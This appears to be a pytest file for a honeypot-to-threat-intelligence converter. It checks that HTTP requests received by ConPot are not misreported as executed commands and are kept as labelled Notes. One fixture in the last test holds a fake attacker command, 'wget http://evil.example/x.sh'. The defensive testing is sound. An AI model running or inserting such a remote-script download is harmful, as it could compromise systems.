"""A request a sensor RECEIVED is not a command anyone RAN.

ConPot appended raw HTTP request blobs to `session.commands` purely to reuse
Note rendering. Six downstream consumers then believed the field name.
"""
from __future__ import annotations

import pytest

from tpot2cti.parsers.base import AttackSession
from tpot2cti.parsers.conpot import ConPotParser


def _doc(request="GET /ecc/ HTTP/1.1\r\nHost: 10.0.0.1\r\n"):
    return {
        "type": "ConPot", "src_ip": "198.51.100.21", "dest_ip": "192.0.2.3",
        "dest_port": 80, "@timestamp": "2026-08-05T00:00:00.000Z",
        "t-pot_hostname": "sensor01", "request": request, "event_type": "http",
        "id": "abc123",
    }


def _session(docs):
    p = ConPotParser()
    events = [p.parse(d) for d in docs]
    return p.correlate([e for e in events if e is not None])


def test_a_received_request_is_not_recorded_as_a_command():
    sessions = _session([_doc()])
    assert sessions, "parser produced no session"
    s = sessions[0]
    assert s.protocol_requests, "the request blob was lost entirely"
    assert s.commands == [], (
        "a request the sensor RECEIVED is being reported as a command someone "
        "RAN — score, prose, Process SDOs and the bare-scan gate all read this"
    )


def test_a_conpot_probe_no_longer_escapes_the_bare_scan_gate():
    """`_is_bare_scan()` exists to keep drive-by probes at observable-only.
    Every ConPot probe escaped it by carrying a fake command, then collected
    +25 score and prose claiming shell activity."""
    from tpot2cti.main import _is_bare_scan
    s = _session([_doc()])[0]
    assert _is_bare_scan(s), (
        "a single ConPot HTTP probe is still being treated as substantive "
        "interaction rather than a drive-by"
    )


def test_the_blob_is_still_preserved_as_evidence(builder, cfg):
    """Fixing the false claim must not lose the data. The blob is kept in a
    Note, honestly labelled, and never as a Process."""
    s = _session([_doc()])[0]
    objs = builder.build_conpot_session(s)
    kinds = [o["type"] for o in objs]
    assert "process" not in kinds, "still asserting a process was executed"
    notes = [o for o in objs if o["type"] == "note"]
    assert notes, "the request blob was dropped instead of preserved"
    body = notes[0]["content"]
    assert "GET /ecc/" in body, "the actual request is missing from the Note"
    assert "nothing was executed" in body


def test_genuine_shell_commands_are_untouched():
    """The fix must not weaken real command capture from shell honeypots."""
    from datetime import datetime, timezone
    now = datetime(2026, 8, 5, tzinfo=timezone.utc)
    s = AttackSession(
        src_ip="198.51.100.21", session_id="x", sensor_hostname="sensor01",
        event_type="Cowrie", first_seen=now, last_seen=now,
    )
    s.commands.append("wget http://evil.example/x.sh")
    assert s.commands and not s.protocol_requests
